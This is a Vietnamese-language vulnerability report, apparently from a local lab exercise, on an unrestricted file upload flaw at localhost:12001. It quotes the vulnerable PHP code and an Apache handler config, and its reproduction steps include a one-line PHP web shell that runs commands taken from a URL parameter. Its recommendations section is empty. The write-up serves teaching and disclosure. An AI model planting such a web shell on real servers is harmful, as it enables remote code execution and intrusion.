# File Upload ở localhost:12001
### 1. Tổng quan

- lv1 là 1 website để upload file, bấm vào nút Choose File để up file, sau đó submit và có thể click vào link xem nội dụng file đã up

    ![alt text](image.png)
    ![alt text](image-1.png)
Báo cáo này liệt kê các lỗ hổng bảo mật và những vấn đề liên quan được tìm thấy trong quá trình kiểm thử
website. Quá trình kiểm thử được thực hiện dưới hình thức blackbox/Whitebox testing.
### 2. Phạm vi
### 3. Lỗ hổng 

#### Description

Trang web `http://localhost:12001/` là 1 website cho phép upload file và truy nhập trực tiếp file sau khi submit bằng cách click vào link đó.
    
#### Impact

Tại đây, kẻ tấn công có thể upload file php và thực thi mã tùy ý trên server, dẫn đến **Remote Code Execution (RCE)**.

#### Root-cause analysis

Thứ nhất:

Trong mã nguồn `src/index.php`, file upload **không được validate extention**.

    $file = $dir . "/" . $_FILES["file"]["name"];
    move_uploaded_file($_FILES["file"]["tmp_name"], $file);

Thứ 2: 

Anh dev không để ý hành vi của apache mà anh ta đã cấu hình
Vì Trong httpd Apache2, có một loại file cấu hình đặc biệt(`docker-php.conf`) để quyết định rằng loại file nào Apache2 sẽ đưa cho mod-php xử lý.  

Thấy trong mã nguồn `docker-php.conf` đang cấu hình sai hành vi của apache, dẫn tới việc cho phép apache sẽ đưa cho mod-php xử lý các extention **.phar, .phtml** như extention .php

    <FilesMatch ".+\.ph(ar|p|tml)$">
        SetHandler application/x-httpd-php
    </FilesMatch>

#### Steps to reproduce
1. Upload file có tên

    test.php chứa nội dung:

        <?php
            phpinfo();
        ?>
2. Truy cập vào link

    Để apache xử lý:
    ![alt text](image-2.png) 
    ![alt text](image-3.png)

3. RCE

    test.php chứa nội dung:

        <?php
            system($_GET['cmd']);
        ?>

    ![alt text](image-4.png)

#### Recommendations




    
    
    